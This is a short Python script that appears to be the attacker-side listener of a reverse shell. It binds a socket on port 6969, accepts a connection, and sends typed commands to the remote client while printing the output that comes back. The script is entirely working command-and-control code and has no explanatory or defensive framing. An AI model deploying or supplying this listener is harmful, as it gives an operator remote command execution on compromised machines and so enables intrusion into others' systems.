import socket
import sys


def create_socket():
    try:
        global hostname
        global port
        global s
        global local_ip
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        port = 6969
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    try:

        print("Binding the Port: " + str(port) + " with host IP: " + local_ip)
        s.bind((hostname, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()






